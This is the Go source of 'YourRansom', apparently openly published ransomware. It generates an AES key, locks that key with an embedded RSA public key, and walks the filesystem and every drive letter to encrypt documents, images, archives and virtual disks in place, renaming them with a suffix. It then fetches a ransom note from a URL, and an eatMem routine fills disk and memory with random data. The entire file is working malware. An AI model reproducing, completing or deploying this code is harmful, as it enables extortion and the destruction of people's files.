//    YourRansom
//    Copyright (C) 2016 boboliu

//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.

//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.

//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.

//    You also need to use it under [DO NOT BE EVIL] ADDITIONAL LICENSE, There
//    is a copy of [DO NOT BE EVIL] ADDITIONAL LICENSE with this program in git
//    repo.
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"runtime"
	"strings"
)

func encrypt(filename string, cip cipher.Block) error {

	if len(filename) >= 1+len(filesuffix) && filename[len(filename)-len(filesuffix):] == filesuffix {
		return nil
	}

	f, err := os.OpenFile(filename, os.O_RDWR, 0)
	if err != nil {
		return err
	}
	fstat, _ := f.Stat()
	size := fstat.Size()

	buf, out := make([]byte, 16), make([]byte, 16)
	for offset := int64(0); size-offset > 16 && offset < (8*1024*1024); offset += 16 {
		f.ReadAt(buf, offset)
		cip.Encrypt(out, buf)
		f.WriteAt(out, offset)
	}

	f.Close()
	os.Rename(filename, filename+filesuffix)
	return nil
}

func decrypt(filename string, cip cipher.Block) error {

	if len(filename) < 1+len(filesuffix) || filename[len(filename)-len(filesuffix):] != filesuffix {
		return nil
	}
	f, err := os.OpenFile(filename, os.O_RDWR, 0)
	fmt.Println("Decrypting: ", filename)
	if err != nil {
		return err
	}
	fstat, _ := f.Stat()
	size := fstat.Size()
	buf, out := make([]byte, 16), make([]byte, 16)
	for offset := int64(0); size-offset > 16 && offset < (8*1024*1024); offset += 16 {
		f.ReadAt(buf, offset)
		cip.Decrypt(out, buf)
		f.WriteAt(out, offset)
	}
	f.Close()
	os.Rename(filename, filename[0:len(filename)-len(filesuffix)])
	return nil
}

func filter(path string, action byte) int8 {

	lowPath := strings.ToLower(path)

	innerList := []string{"windows", "program", "appdata", "system"}
	suffixList := []string{".vmdk", ".txt", ".zip", ".rar", ".7z", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx", ".jpg", ".gif", ".jpeg", ".png", ".mpg", ".mov", ".mp4", ".avi", ".mp3"}

	for _, inner := range innerList {
		if strings.Contains(lowPath, inner) {
			return 0
		}
	}
	for _, suffix := range suffixList {
		if strings.HasSuffix(lowPath, suffix) {
			return 1
		}
	}
	return 2
}

func do_cAll(path string, cip cipher.Block, action byte) error {

	if filter(path, action) == 0 {
		return nil
	}

	dir, serr := os.Stat(path)
	if serr != nil {
		return serr
	}

	if !dir.IsDir() {
		switch action {
		case 'e':
			if filter(path, action) != 1 {
				return nil
			}
			encrypt(path, cip)
		case 'd':
			decrypt(path, cip)
		}
	}

	fd, err := os.Open(path)
	if err != nil {
		return err
	}

	names, err1 := fd.Readdirnames(100)
	if len(names) == 0 || err1 != nil {
		return nil
	}

	for _, name := range names {
		do_cAll(path+string(os.PathSeparator)+name, cip, action)
	}
	return nil
}

func cAll(cip cipher.Block, action byte) {

	defer func() {
		if action == 'e' {
			downloadReadme()
		}
	}()

	if runtime.GOOS != "windows" {
		do_cAll("/", cip, action)
	}

	DriverChan := make(chan bool, 26)
	for i := 0; i < 26; i++ {
		go func(path string, cip cipher.Block, action byte, ExitChan chan bool) {
			do_cAll(path, cip, action)
			ExitChan <- true
		}(string('A'+i)+":\\", cip, action, DriverChan)
	}
	for i := 0; i < 26; i++ {
		<-DriverChan
	}

	return
}

func saveKey(cip []byte) {
	keyFile, _ := os.Create(keyFilename)
	block, _ := pem.Decode(pubKey)
	pubI, _ := x509.ParsePKIXPublicKey(block.Bytes)
	pub := pubI.(*rsa.PublicKey)
	word, _ := rsa.EncryptPKCS1v15(rand.Reader, pub, cip)
	keyFile.WriteAt(word, 0)
	return
}

func eatMem() {
	randBytes := make([]byte, 1280)
	rand.Read(randBytes)
	eatNum := 0
	for i := 0; i < len(randBytes); i++ {
		eatNum += int(randBytes[i])
	}
	c := make([]string, eatNum)
	tmpc := make([]byte, 1024)
	pf, _ := os.Create("programdata" + filesuffix)
	for i := 0; i < eatNum-1; i++ {
		rand.Read(tmpc)
		c[i] = string(tmpc)
		pf.Write(tmpc)
	}
	return
}

func downloadReadme() {
	res, err := http.Get(readmeUrl)
	if err != nil {
		ioutil.WriteFile(readmeFilename, readme, 0)
		return
	}
	defer res.Body.Close()
	data, _ := ioutil.ReadAll(res.Body)
	ioutil.WriteFile(readmeNetFilename, data, 0)
	return
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	fmt.Println(string(alert))
	action := true
	bb, err := ioutil.ReadFile(dkeyFilename)
	if err != nil {
		action = false
	}
	b := make([]byte, 32)
	if !action {
		rand.Read(b)
		cip, _ := aes.NewCipher(b)
		saveKey(b)
		cAll(cip, 'e')
		//		do_cAll("test", cip, 'e')
		return
	} else {
		cip, _ := aes.NewCipher(bb)
		fmt.Println("Your files are decrypting...")
		cAll(cip, 'd')
		//		do_cAll("test", cip, 'd')
		return
	}
}
